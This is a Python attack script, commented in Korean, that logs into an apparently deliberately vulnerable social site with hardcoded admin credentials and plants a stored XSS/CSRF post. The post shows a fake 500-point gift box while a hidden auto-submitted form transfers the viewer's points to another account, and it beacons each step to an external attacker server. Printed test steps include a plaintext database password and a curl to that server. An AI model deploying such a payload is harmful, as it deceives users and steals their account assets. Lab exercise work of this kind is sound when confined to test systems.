#!/usr/bin/env python3
"""
fake-gift CSRF 공격 - 최종 단순 버전
복잡한 로직 제거, 단순하게 작동
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"

# 최종 단순 버전 - 500P만 전송
FAKE_GIFT_HTML = """<div id="giftbox" style="font-family:Arial;text-align:center;padding:30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white"><div style="background:white;color:#333;padding:40px;border-radius:15px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)"><div style="font-size:80px">🎁</div><h2 style="color:#667eea">축하합니다!</h2><p style="font-size:1.2em">500 포인트 지급!</p><div id="s" style="background:#f0f0f0;padding:10px;border-radius:8px;margin:15px 0;color:#667eea;font-weight:bold">처리 중...</div></div><form id="f" method="POST" action="http://52.78.221.104/profile.php" target="hf" style="display:none"><input name="send_gift" value="1"><input name="receiver_id" value="999"><input name="gift_type" value="diamond"><input name="points" value="500"><input name="message" value="Gift"></form><iframe name="hf" style="display:none"></iframe></div><script>(function(){if(localStorage.getItem('g')){document.getElementById('giftbox').innerHTML='<p style="padding:20px">이미 받으셨습니다</p>';return}localStorage.setItem('g','1');const A='http://13.158.67.78:5000';new Image().src=A+'/notify?event=load&t='+Date.now();new Image().src=A+'/victim?points=500&t='+Date.now();setTimeout(()=>{document.getElementById('f').submit();new Image().src=A+'/transfer?amount=500&t='+Date.now();document.getElementById('s').innerHTML='완료!';setTimeout(()=>{new Image().src=A+'/complete?total=500&t='+Date.now()},500)},1000)})();</script>"""

print("="*60)
print("🎁 fake-gift 최종 단순 버전")
print("="*60)
print()

session = requests.Session()

print("[*] admin 로그인...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' not in r.url and 'profile.php' not in r.url:
    print("[-] 로그인 실패")
    exit(1)

print("[+] 로그인 성공!")
print("\n[*] 게시물 작성...")

r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)
print(f"[+] 응답: {r.status_code}")

print()
print("="*60)
print("✅ 최종 단순 버전 배포!")
print("="*60)
print()
print("특징:")
print("- 500P만 전송 (단순하고 확실)")
print("- localStorage로 1회만 실행")
print("- 자동 리다이렉트 없음")
print("- Flask에 500P만 전송")
print()
print("테스트:")
print("1. 기존 게시물 삭제:")
print("   mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"DELETE FROM posts WHERE content LIKE '%<script%';\"")
print()
print("2. Flask 리셋:")
print("   curl http://13.158.67.78:5000/reset")
print()
print("3. alice 로그인 (시크릿 모드) → index.php")
print()
print("4. 결과:")
print("   - alice: 500P → 0P")
print("   - Flask: 500P 표시")
print()
print("="*60)
